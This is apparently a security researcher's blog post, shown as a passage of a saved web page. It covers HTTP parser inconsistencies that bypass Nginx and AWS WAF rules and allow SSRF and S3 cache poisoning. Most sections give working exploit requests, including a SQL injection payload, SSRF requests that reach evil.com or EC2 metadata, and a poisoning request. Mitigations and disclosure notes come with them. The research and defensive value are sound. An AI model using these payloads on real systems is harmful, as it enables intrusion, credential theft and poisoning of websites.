`\\x85`, `\\xA0`, `\\x1F`, `\\x1E`, `\\x1D`, `\\x1C`, `\\x0C`, `\\x0B` |\n\n## Bypassing Nginx ACL Rules With Spring Boot\n\nSpring removes the characters `\\x09` and `\\x3B` from the URL path, but Nginx doesn't.\n\nTake the following Nginx configuration/API source code as a reference:\n\n```plaintext\nlocation = /admin {\n    deny all;\n}\n\nlocation = /admin/ {\n    deny all;\n}\n```\n\n```java\n@GetMapping(\"/admin\")\npublic String admin() {\n    return \"Greetings from Spring Boot!\";\n}\n```\n\nBelow, you will find a demonstration of how ACL protection can be circumvented by adding the character `\\x09` or `\\t` at the end of the pathname:\n\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686753921718/b3f91ea3-558f-4889-860c-15cdc02cb7f6.png align=\"center\")\n\n| Nginx Version | **Spring Boot Bypass Characters** |\n| --- | --- |\n| 1.22.0 | `;` |\n| 1.21.6 | `;` |\n| 1.20.2 | `\\x09`, `;` |\n| 1.18.0 | `\\x09`, `;` |\n| 1.16.1 | `\\x09`, `;` |\n\n## Bypassing Nginx ACL Rules With PHP-FPM Integration\n\nPHP-FPM (FastCGI Process Manager) is a robust and high-performance PHP FastCGI implementation that works seamlessly with Nginx. It serves as a standalone server for handling PHP requests, improving the speed and efficiency of PHP execution. Nginx acts as a reverse proxy, receiving incoming HTTP requests and passing them to PHP-FPM for processing.\n\nLet's consider the following Nginx FPM configuration:\n\n```plaintext\nlocation = /admin.php {\n    deny all;\n}\n\nlocation ~ \\.php$ {\n    include snippets/fastcgi-php.conf;\n    fastcgi_pass unix:/run/php/php8.1-fpm.sock;\n}\n```\n\nWhen two `.php` files are in the same pathname of the HTTP request, PHP will match the first one, ignoring everything after the slash. Since the Nginx is configured to block requests to the specific endpoint `/admin.php`, it's possible to access the admin.php file by doing the following request:\n\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686758750001/66ac562a-7da9-4397-a76a-1d641474e000.png align=\"center\")\n\nBelow is a graphical example of how the applications interpret the HTTP request:\n\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686758967146/03073365-9dbf-4cf5-8762-1d705c9a038c.png align=\"center\")\n\nThis technique only works if the second PHP file, in this case, `index.php`, exists in the server structure. Take the following server code/structure as a reference:\n\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686758832956/d0708099-48e0-46d0-b646-8bb92c51454a.png align=\"center\")\n\nThese behaviors were reported to the Nginx security team in 2022, and they responded by saying that they don't have responsibility for it.\n\nSince the research concluded in April 2022, newer versions of Nginx were not specifically tested. However, it is highly likely that the findings and vulnerabilities identified in the research are reproducible in the latest version of Nginx as well.\n\n## How to prevent\n\nTo prevent these issues, you must use the `~` expression Instead of the `=` expression on Nginx ACL rules, for example:\n\n```plaintext\nlocation ~* ^/admin {\n    deny all;\n}\n```\n\nThe `~` expression matches the string `/admin` in any part of the pathname, in other words, if a user sent a request to `/admin1337`, the request will also be blocked.\n\n# Bypassing AWS WAF ACL\n\n## How AWS WAF ACLs Work\n\nAWS ACL (Access Control List) rules are a component of load balancers, providing control over incoming and outgoing network traffic. These rules define access permissions based on specified conditions, allowing or denying requests to and from the load balancer.\n\nYou can configure the AWS Web Application Firewall (WAF) ACL to examine and validate HTTP headers. AWS WAF ACL rules allow you to define conditions based on specific header attributes or values, enabling you to control and filter incoming requests.\n\nHeader ACL example:\n\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686762641000/8f9c4e41-c17a-48d6-b2f5-72d76217e337.png align=\"center\")\n\nIn the above example, if a request contains a SQL Injection payload in the `X-Query` header, AWS WAF recognizes the SQL Injection attempt and responds with a `403 Forbidden` HTTP status code. This prevents the request from being forwarded to the backend, effectively blocking any potential exploitation of the application's database through SQL Injection attacks.\n\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686763561032/d592bd74-2618-461d-9768-314549b691cf.png align=\"center\")\n\nAs you can see, the above request carried the payload `' or '1'='1' --` at the `X-Query` header, and then was blocked by the AWS WAF.\n\n## Bypassing AWS WAF ACL With Line Folding\n\nWeb servers like Node.js, Flask and many others sometimes encounter a phenomenon known as \"line folding.\" Line folding refers to the practice of splitting long header values using the characters \\\\x09 (tab) and \\\\x20 (space) into multiple lines for readability. However, this behavior can lead to compatibility issues and potential security vulnerabilities.\n\nFor example, the header `1337: Value\\r\\n\\t1337` in the following request will be interpreted as `1337: Value\\t1337` in the Node.js server:\n\n```http\nGET / HTTP/1.1\nHost: target.com\n1337: Value\n    1337\nConnection: close\n```\n\nKnowing it, I discovered that it's possible to bypass the AWS WAF by using line folding behavior.\n\nUsing the same AWS WAF that protects the `X-Query` from SQL Injection payloads, the following HTTP request was used to confirm that the Node.js server received the payload `' or '1'='1' --` in the `X-Query` header.\n\nBelow is a graphical example of how the applications interpret the HTTP request header with line folding:\n\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686765599948/440f51b0-18bb-451c-92da-3428000cd7f0.png align=\"center\")\n\nFor the exploitation scenario, let's take the following Node.js source code as a reference. It will return the requested headers as a Json:\n\n```javascript\napp.get('/*', (req, res) =\u003e {\n    res.send(req.headers);\n});\n```\n\nBelow is an example of an exploitation request:\n\n```http\nGET / HTTP/1.1\\r\\n\nHost: target.com\\r\\n\nX-Query: Value\\r\\n\n\\t' or '1'='1' -- \\r\\n\nConnection: close\\r\\n\n\\r\\n\n```\n\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686765362775/dbd69c56-503e-45bb-ada6-358d3d987ede.png align=\"center\")\n\nIn the provided screenshot, it is evident that the Node.js application interpreted the characters `' or '1'='1' --` as the value for the `X-Query` header. However, the AWS WAF treated it as a header name instead.\n\nThis bypass technique was reported to the AWS security team and fixed in 2022.\n\n# Incorrect Path Parsing Leads to Server-Side Request Forgery\n\nIn the previous sections, I provided reasons to be cautious about trusting reverse proxies. However, in this section, I will demonstrate why utilizing a reverse proxy can be advantageous...\n\nIn this section, I will leverage an incorrect pathname interpretation to exploit a Server-Side Request Forgery vulnerability in popular servers and frameworks such as Spring Boot, Flask, and PHP.\n\nNormally, a valid HTTP pathname starts with `/` or `http(s)://domain/`, but the majority of the popular WEB servers do not verify it correctly, which can lead to a security risk.\n\n## SSRF on Flask Through Incorrect Pathname Interpretation\n\nFlask is a lightweight web framework for Python, and it offers a straightforward and flexible approach to web development.\n\nAfter conducting tests on Flask's pathname parsing, I discovered that it accepts certain characters that it shouldn't. As an example, the following HTTP request, which should be considered invalid, is surprisingly treated as valid by the framework, but the server responds `404 Not Found`:\n\n```http\nGET @/ HTTP/1.1\nHost: target.com\nConnection: close\n```\n\nWhile investigating how this behavior can potentially result in a security vulnerability, I came across a helpful [Medium blog post](https://medium.com/@zwork101/making-a-flask-proxy-server-online-in-10-lines-of-code-44b8721bca6) that demonstrates the creation of a proxy using the Flask framework. Below is an example of the code provided in the blog post:\n\n```python\nfrom flask import Flask\nfrom requests import get\n\napp = Flask('__main__')\nSITE_NAME = 'https://google.com/'\n\n@app.route('/', defaults={'path': ''})\n@app.route('/\u003cpath:path\u003e')\ndef proxy(path):\n  return get(f'{SITE_NAME}{path}').content\n\napp.run(host='0.0.0.0', port=8080)\n```\n\nMy first thought was: \"*What if the developer forgets to add the last slash in the* `SITE_NAME` *variable?*\". And yes, it can lead to an SSRF.\n\nSince Flask also allows any ASCII character after the `@`, it's possible to fetch an arbitrary domain after concatenating the malicious pathname and the destination server.\n\nPlease consider the following source code as a reference for the exploitation scenario:\n\n```python\nfrom flask import Flask\nfrom requests import get\n\napp = Flask('__main__')\nSITE_NAME = 'https://google.com'\n\n@app.route('/', defaults={'path': ''})\n@app.route('/\u003cpath:path\u003e')\n\ndef proxy(path):\n  return get(f'{SITE_NAME}{path}').content\n\nif __name__ == \"__main__\":\n    app.run(threaded=False)\n```\n\nPresented below is an example of an exploitation request:\n\n```http\nGET @evildomain.com/ HTTP/1.1\nHost: target.com\nConnection: close\n```\n\nIn the following example, I was able to fetch my EC2 metadata:\n\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686771183056/fe166abf-b2cb-41be-846b-11ac56b33d71.png align=\"center\")\n\n## SSRF on Spring Boot Through Incorrect Pathname Interpretation\n\nUpon discovering the presence of an SSRF vulnerability in Flask, I delved into exploring how this behavior could be exploited in other frameworks. As my research progressed, it became apparent that Spring Boot is also susceptible to this particular issue.\n\nAuthentication bypasses, ACL bypasses, and path traversal are known vectors when the application parses Matrix parameters. Servlet matrix parameters are a feature introduced in the Servlet specification that allows you to extract and handle additional data present in the URL path. Unlike query parameters that are separated by the `?` character, matrix parameters are separated by the `;` character within the URL.\n\nDuring the research, I discovered that the Spring framework accepts the matrix parameter separator character `;` before the first slash of the HTTP pathname:\n\n```http\nGET ;1337/api/v1/me HTTP/1.1\nHost: target.com\nConnection: close\n```\n\nIf a developer implements a server-side request that utilizes the complete pathname of the request to fetch an endpoint, it can lead to the emergence of Server-Side Request Forgery (SSRF).\n\nPlease consider the following source code as a reference for the exploitation scenario:\n\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686772007869/5661fff8-9e48-4c63-b78b-cb69ee0582c0.png align=\"center\")\n\nThe code snippet above utilizes the `HttpServletRequest` API to retrieve the requested URL through the `getRequestURI()` function. Subsequently, it concatenates the requested URI with the destination endpoint http://ifconfig.me.\n\nConsidering that Spring permits any character following the Matrix parameter separator, becoming possible to use the `@` character to fetch an arbitrary endpoint as well.\n\nBelow is an example of the exploit request:\n\n```http\nGET ;@evil.com/url HTTP/1.1\nHost: target.com\nConnection: close\n```\n\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686772361453/e66a9edf-a590-4d82-b75a-180c33ae1a21.png align=\"center\")\n\n## PHP Built-in Web Server Case Study - SSRF Through Incorrect Pathname Interpretation\n\nThe PHP Built-in web server suffers from the same vulnerability. Still, the Built-in server is not used in production involvements, so I decided to present this behavior as a case study that is unlikely to happen in real-world applications.\n\nSurprisingly, PHP allows the asterisk `*` character before the first slash in the pathname, and between the asterisk and the first slash, almost all ASCII characters are accepted as valid HTTP request.\n\nHowever, there are two limitations that arise with PHP:\n\n1. This technique can only be used for the root pathname `/` and cannot be applied to other endpoints, in other words, the vulnerable code must be in the `index.php` file;\n    \n2. Dots `.` are not allowed before the first slash, which restricts the inclusion of arbitrary IPs and domains, to circumvent it, the payload must include a dotless-hex encoded IP address of the malicious domain.\n    \n\nLet's consider the following PHP code for this exploitation scenario:\n\n```php\n\u003c?php\n$site = \"http://ifconfig.me\";\n$current_uri = $_SERVER['REQUEST_URI'];\n\n$proxy_site = $site.$current_uri;\nvar_dump($proxy_site);\n\necho \"\\n\\n\";\n\n$response = file_get_contents($proxy_site);\nvar_dump($response);\n?\u003e\n```\n\nThe provided code retrieves the HTTP request pathname using `$_SERVER['REQUEST_URI']` and concatenates it with the destination domain.\n\nFor performing IP address dotless-hex encoding, you can utilize the tool [ip-encoder.py](https://gist.github.com/mhmdiaa/2587e2330b87db99c81ace2a190e235f).\n\nThe resulting payload used for exploiting which fetches the EC2 metadata is as follows:\n\n```http\nGET *@0xa9fea9fe/ HTTP/1.1\nHost: target.com\nConnection: close\n```\n\nIn the following proof of concept, I successfully retrieved my EC2 metadata:\n\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686789542807/4ca585ed-37e3-4384-bec0-ba2c6e59e75a.png align=\"center\")\n\n## How to prevent\n\n* It is essential to consistently employ complete URL domains when concatenating them with user input. For instance, ensure that a trailing slash is added after the domain name, such as `http://ifconfig.me/`.\n    \n* Utilizing a reverse proxy that effectively handles HTTP requests. The vulnerabilities mentioned are typically only possible if the framework is used without any additional reverse proxy that verifies the HTTP pathname. In other words, incorporating a reverse proxy can significantly enhance the security of the web application.\n    \n\n# HTTP Desync Cache Poisoning Attacks\n\nInconsistencies exist among servers and reverse proxies when it comes to removing invalid invisible characters from header names before interpreting them. This inconsistency can lead to notable vulnerabilities, such as HTTP Request Smuggling. But in this section, I will discuss a vulnerability and technique that I discovered during my research that combines Desync attacks with Cache Poisoning, which affects cache servers when integrated with AWS S3 buckets.\n\nBut before we continue, we must understand some functionalities of cache servers.\n\n## Cache Keys\n\nCache keys are unique identifiers used by cache servers to store and retrieve cached data, they serve as references or labels that allow access to cached content.\n\nThe most frequently used cache key is typically derived from the URL's pathname. When a user sends a request to a server that utilizes caching, the cache server employs the requested URL to locate the corresponding cached response to serve back to the user.\n\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686943618847/430c595b-b7ca-4dec-b31c-58374b1d0a30.webp align=\"center\")\n\nIn addition to the URL's pathname, another default cache key is the Host header. Let's consider a scenario where a cached JavaScript file is located at `https://target.com/static/main.js`. When a user sends an HTTP request to this cached URL, the cache server will return the stored response without having to forward the request to the backend server.\n\nHowever, if a user sends an HTTP request to the same endpoint but modifies the Host header to `1337.target.com`, the cache server will attempt to retrieve the backend of the corresponding response for the `/static/main.js` URL using the `1337.target.com` host header. Subsequently, it will generate a stored response specifically for that particular HTTP message.\n\n## S3 HTTP Desync Cache Poisoning Issue\n\nIn this section, I will demonstrate an HTTP Desync vulnerability that can result in Cache Poisoning, impacting principally AWS S3 buckets.\n\nIn the Amazon AWS S3 buckets, the Host header plays a crucial role in routing requests to the correct bucket and enabling proper access to the stored content. When interacting with an S3 bucket, the Host header helps direct requests to the appropriate endpoint within the AWS infrastructure.\n\nWhen a request is made to an S3 bucket, the AWS infrastructure inspects the Host header to determine the target bucket. So if a user sends an HTTP request to the domain `your.s3.amazonaws.com` but changes the host header to `my.s3.amazonaws.com`, internally, AWS will \"ignore\" the domain name, fetching the bucket specified in the host header only. This is a common practice on Cloud services.\n\n### The Vulnerability\n\nThe interpretation of host headers for S3 buckets involves two key aspects:\n\n1. When multiple host headers are included in the request, only the first one will be taken, and any additional headers will be ignored.\n    \n2. The following bytes are ignored if present in the header name: `\\x1f`, `\\x1d`, `\\x0c`, `\\x1e`, `\\x1c`, `\\x0b`;\n    \n\nThe vulnerability arises from an inconsistency in the host header interpretation. If the cache server mistakenly includes the ignored bytes as part of the header name, treating it as an invalid host header, while S3 interprets it as a valid host header, it becomes possible to cache arbitrary bucket responses on vulnerable websites.\n\nThis behavior allows caching arbitrary S3 bucket content in vulnerable websites.\n\nConsider the following exploitation request:\n\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686958907855/ffd360e3-5eb8-4ffd-939d-b46614f9f430.png align=\"center\")\n\n```http\nGET / HTTP/1.1\n[\\x1d]Host: evilbucket.com\nHost: example.bucket.com\nConnection: close\n```\n\n* First, the cache server examines the header `\\x1dHost: evilbucket.com` and treats it like any other unkeyed header;\n    \n* Subsequently, the cache server will correctly interpret the `example.bucket.com` header as a valid host header, resulting in the final cache response being associated with this host value.\n    \n* Upon reaching the S3 bucket, the header `\\x1dHost: evilbucket.com` will be mistakenly interpreted as a valid host header, while the intended `Host: example.bucket.com` header will be ignored. This misinterpretation by AWS will lead to the fetching of the malicious header's associated bucket.\n    \n\nThe final result is a complete cache poisoning of the page with arbitrary content.\n\nThe proof of concept video demonstrates the exploitation of this vulnerability in an outdated Varnish cache server. It is important to note that newer versions of Varnish are not susceptible to this vulnerability:\n\n%[https://www.youtube.com/watch?v=dnf6Zi5eNW8] \n\nIn addition to Varnish, other cache servers such as Akamai were also vulnerable to this issue. However, it's important to note that this vulnerability has been addressed and cannot be reproduced on any AWS service today.\n\n# Conclusion\n\nIn conclusion, this research delved into the realm of security vulnerabilities in web applications, specifically focusing on HTTP parsers and the implications they can have on overall security. By exploring inconsistencies in HTTP parsers across various technologies, such as load balancers, reverse proxies, web servers, and caching servers, I unveiled potential avenues for exploitation.\n\nI demonstrated how certain behaviors, like path normalization and the acceptance of special characters, can lead to bypassing security rules and even opening the door to Server-Side Request Forgery (SSRF) and Cache Poisoning vulnerabilities.\n\nMoreover, I highlighted the significance of utilizing reverse proxies that effectively validate and sanitize HTTP requests. Implementing a robust reverse proxy can significantly bolster the security posture of a web application by intercepting and filtering malicious requests before they reach the backend servers."},"views":19538,"preferences":{"pinnedToBlog":false,"disableComments":false,"stickCoverToBottom":true,"isDelisted":false},"readTimeInMinutes":17,"series":null,"tags":[{"id":"56744721958ef13879b94c04","slug":"http","name":"http"},{"id":"5f2e70c0b8ac395b1f23a6cb","slug":"cybersecurity-1","name":"#cybersecurity"},{"id":"56744723958ef13879b952cb","slug":"research","name":"research"},{"id":"56744722958ef13879b94f40","slug":"web","name":"web"},{"id":"6491b91ec167b41645fd218f","slug":"desync-attacks","name":"Desync Attacks"}],"ogMetaData":{"image":"https://cdn.hashnode.com/res/hashnode/image/upload/v1687022613860/91867fcc-2a19-4dfb-8fd5-5758b016ad37.avif"},"canonicalUrl":null,"hasLatexInPost":false,"audioUrls":null,"isFollowed":null,"bookmarked":false,"features":{"tableOfContents":{"isEnabled":true,"items":[{"__typename":"TableOfContentsItem","id":"d050ee56-187a-4a8e-9fa6-a99d575bb874","level":1,"slug":"pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules","title":"Pathname Manipulation: Bypassing Reverse Proxies and Load Balancers Security Rules","parentId":null},{"__typename":"TableOfContentsItem","id":"fa166e5c-0b0e-4957-8eb7-88f7c58f4415","level":2,"slug":"nginx-acl-rules","title":"Nginx ACL Rules","parentId":"d050ee56-187a-4a8e-9fa6-a99d575bb874"},{"__typename":"TableOfContentsItem","id":"f5554760-21fd-4080-9078-0e9a31adb2c5","level":2,"slug":"trim-inconsistencies","title":"Trim Inconsistencies","parentId":"d050ee56-187a-4a8e-9fa6-a99d575bb874"},{"__typename":"TableOfContentsItem","id":"04aa7506-34d7-4291-9c36-6f0429fef520","level":2,"slug":"bypassing-nginx-acl-rules-with-nodejs","title":"Bypassing Nginx ACL Rules With Node.js","parentId":"d050ee56-187a-4a8e-9fa6-a99d575bb874"},{"__typename":"TableOfContentsItem","id":"1d9a1daa-f753-4b31-9452-fb3bccc334c5","level":2,"slug":"bypassing-nginx-acl-rules-with-flask","title":"Bypassing Nginx ACL Rules With Flask","parentId":"d050ee56-187a-4a8e-9fa6-a99d575bb874"},{"__typename":"TableOfContentsItem","id":"bf06e637-fa3c-4b02-bbd0-535e8862ed60","level":2,"slug":"bypassing-nginx-acl-rules-with-spring-boot","title":"Bypassing Nginx ACL Rules With Spring Boot","parentId":"d050ee56-187a-4a8e-9fa6-a99d575bb874"},{"__typename":"TableOfContentsItem","id":"8d8306a9-c4fa-4c45-92fa-aebb2e886f80","level":2,"slug":"bypassing-nginx-acl-rules-with-php-fpm-integration","title":"Bypassing Nginx ACL Rules With PHP-FPM Integration","parentId":"d050ee56-187a-4a8e-9fa6-a99d575bb874"},{"__typename":"TableOfContentsItem","id":"80d340c5-2edf-4d76-a751-cb85c81df78c","level":2,"slug":"how-to-prevent","title":"How to prevent","parentId":"d050ee56-187a-4a8e-9fa6-a99d575bb874"},{"__typename":"TableOfContentsItem","id":"6493de19-d626-479e-8986-84670b6f85ae","level":1,"slug":"bypassing-aws-waf-acl","title":"Bypassing AWS WAF ACL","parentId":null},{"__typename":"TableOfContentsItem","id":"df30fef9-02f8-47db-9cbe-1e49a3f36343","level":2,"slug":"how-aws-waf-acls-work","title":"How AWS WAF ACLs Work","parentId":"6493de19-d626-479e-8986-84670b6f85ae"},{"__typename":"TableOfContentsItem","id":"70a52fc0-b644-4cc4-a712-6eb7ad60fc7f","level":2,"slug":"bypassing-aws-waf-acl-with-line-folding","title":"Bypassing AWS WAF ACL With Line Folding","parentId":"6493de19-d626-479e-8986-84670b6f85ae"},{"__typename":"TableOfContentsItem","id":"268678d3-485e-49a1-89c3-048811a313e2","level":1,"slug":"incorrect-path-parsing-leads-to-server-side-request-forgery","title":"Incorrect Path Parsing Leads to Server-Side Request Forgery","parentId":null},{"__typename":"TableOfContentsItem","id":"1bcc7d29-1379-4cc8-8883-14c1c107dea2","level":2,"slug":"ssrf-on-flask-through-incorrect-pathname-interpretation","title":"SSRF on Flask Through Incorrect Pathname Interpretation","parentId":"268678d3-485e-49a1-89c3-048811a313e2"},{"__typename":"TableOfContentsItem","id":"7b140771-f25b-4aab-94ee-5bd0cff5a2ae","level":2,"slug":"ssrf-on-spring-boot-through-incorrect-pathname-interpretation","title":"SSRF on Spring Boot Through Incorrect Pathname Interpretation","parentId":"268678d3-485e-49a1-89c3-048811a313e2"},{"__typename":"TableOfContentsItem","id":"c40f232f-b920-4fda-9696-dcf62c980f49","level":2,"slug":"php-built-in-web-server-case-study-ssrf-through-incorrect-pathname-interpretation","title":"PHP Built-in Web Server Case Study - SSRF Through Incorrect Pathname Interpretation","parentId":"268678d3-485e-49a1-89c3-048811a313e2"},{"__typename":"TableOfContentsItem","id":"79b3a29d-790b-405f-89b2-bfadc5a39975","level":2,"slug":"how-to-prevent-1","title":"How to prevent","parentId":"268678d3-485e-49a1-89c3-048811a313e2"},{"__typename":"TableOfContentsItem","id":"9eca8c72-0edf-49bf-8996-76be2ee82761","level":1,"slug":"http-desync-cache-poisoning-attacks","title":"HTTP Desync Cache Poisoning Attacks","parentId":null},{"__typename":"TableOfContentsItem","id":"73d5400e-1c74-4ecf-92d6-6cbecd247573","level":2,"slug":"cache-keys","title":"Cache Keys","parentId":"9eca8c72-0edf-49bf-8996-76be2ee82761"},{"__typename":"TableOfContentsItem","id":"81f4c133-20bb-4d3e-afcf-117cf80024c6","level":2,"slug":"s3-http-desync-cache-poisoning-issue","title":"S3 HTTP Desync Cache Poisoning Issue","parentId":"9eca8c72-0edf-49bf-8996-76be2ee82761"},{"__typename":"TableOfContentsItem","id":"7ec99b8e-175c-4a52-aa2f-84d419d9ec8e","level":3,"slug":"the-vulnerability","title":"The Vulnerability","parentId":"81f4c133-20bb-4d3e-afcf-117cf80024c6"},{"__typename":"TableOfContentsItem","id":"b8bf3109-7624-4bf1-a074-a1c3d0bd7727","level":1,"slug":"conclusion","title":"Conclusion","parentId":null}]},"badges":{"isEnabled":true,"items":[{"id":"5f741eac07891b4f5b9ec8cd","type":"FEATURED_HASHNODE"}]}},"isAutoPublishedFromRSS":false,"authenticatedUserLikes":{"edges":[]},"isShadowBanned":false,"isAskMeAnything":false},"staticPage":null},"series":null}},"__N_SSP":true},"page":"/[...slug]","query":{"slug":["exploiting-http-parsers-inconsistencies"]},"buildId":"ctUu2Z9dMYJ3vBU6iMarJ","isFallback":false,"dynamicIds":[87179],"gssp":true,"scriptLoader":[]}</script><div id="hn-modal"></div><div id="hn-toast"></div><next-route-announcer><p aria-live="assertive" id="__next-route-announcer__" role="alert" style="border: 0px; clip: rect(0px, 0px, 0px, 0px); height: 1px; margin: -1px; overflow: hidden; padding: 0px; position: absolute; top: 0px; width: 1px; white-space: nowrap; overflow-wrap: normal;"></p></next-route-announcer><script src="./(Research) Exploiting HTTP Parsers Inconsistencies_files/5772-330b7829e95060dd.js"></script><script src="./(Research) Exploiting HTTP Parsers Inconsistencies_files/4960-94ed0038f96b4de8.js"></script><script src="./(Research) Exploiting HTTP Parsers Inconsistencies_files/index-8c420d2431aa5414.js"></script></body></html>